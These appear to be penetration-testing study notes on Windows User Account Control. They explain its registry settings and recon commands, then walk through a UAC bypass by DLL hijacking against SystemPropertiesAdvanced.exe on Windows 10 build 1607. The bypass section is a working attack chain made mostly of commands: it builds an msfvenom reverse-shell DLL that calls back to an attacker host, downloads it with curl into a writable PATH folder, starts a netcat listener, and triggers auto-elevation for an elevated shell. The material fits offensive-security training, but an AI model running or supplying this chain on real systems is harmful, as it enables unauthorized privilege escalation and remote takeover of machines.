## Concept
- UAC = consent prompt for elevated actions. Not a security boundary, just a speed bump.
- Standard users run with standard token. Admins in Admin Approval Mode (AAM) get two tokens: standard + elevated.
- Built-in RID 500 Administrator always runs high integrity.
- Configured via `secpol.msc` or GPO. Key registry path:
  `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System`

## Key UAC Registry Settings

| Policy | Registry Key | Default |
|--------|--------------|---------|
| AAM for built-in admin | `FilterAdministratorToken` | Disabled |
| Admin prompt behavior | `ConsentPromptBehaviorAdmin` | Prompt for consent |
| Standard user prompt | `ConsentPromptBehaviorUser` | Prompt for credentials |
| Installer detection | `EnableInstallerDetection` | Home: Enabled / Enterprise: Disabled |
| Signed code only | `ValidateAdminCodeSignatures` | Disabled |
| Secure UIAccess paths | `EnableSecureUIAPaths` | Enabled |
| Run all admins in AAM | `EnableLUA` | Enabled |
| Secure desktop prompt | `PromptOnSecureDesktop` | Enabled |
| Virtualization | `EnableVirtualization` | Enabled |

## Recon Commands

### Current user context
```cmd
whoami /user
```
Shows current user SID.

### Check admin group membership
```cmd
net localgroup administrators
```
Confirms if current user is in Administrators group.

### Current privileges
```cmd
whoami /priv
```
Shows available privileges. Fewer privileges = standard token.

### Confirm UAC is enabled
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
`0x1` = UAC enabled; `0x0` = disabled.

### Check UAC level
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
`0x5` = Always notify (hardest to bypass). Lower values = more bypass opportunities.

### Check Windows build
```powershell
[environment]::OSVersion.Version
```
Build number determines which UAC bypasses work. Cross-reference with [Windows release table](https://en.wikipedia.org/wiki/Windows_10_version_history).
**The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.

## UAC Bypass via DLL Hijacking (UACME #54)

**Target:** Windows 10 build 14393 (1607). `SystemPropertiesAdvanced.exe` (32-bit) auto-elevates and tries to load missing `srrstr.dll`.

### DLL search order (relevant)
1. Application directory
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Directories in `%PATH%`

### Review PATH for writable folder
```cmd
cmd /c echo %PATH%
```
Look for a user-writable folder like `C:\Users\<user>\AppData\Local\Microsoft\WindowsApps`.

### Generate malicious DLL
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```
Outputs 32-bit reverse-shell DLL.

### Serve DLL from attack host
```bash
sudo python3 -m http.server 8080
```

### Download DLL to writable PATH folder
```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

### Start listener
```bash
nc -lvnp 8443
```

### Test normal execution (non-elevated)
```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
Confirms the DLL works but gives standard user shell.

### Clean up leftover rundll32 processes
```cmd
tasklist /svc | findstr "rundll32"
taskkill /PID <PID> /F
```

### Trigger auto-elevation and get elevated shell
```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
Trusted binary loads hijacked `srrstr.dll` with high integrity token → elevated reverse shell.

## Key Takeaways
- UAC is bypassable; use it as a privilege escalation path, not a defensive guarantee.
- Higher `ConsentPromptBehaviorAdmin` = more secure, fewer public bypasses.
- Auto-elevating binaries + DLL hijacking in writable PATH = common UAC bypass technique.
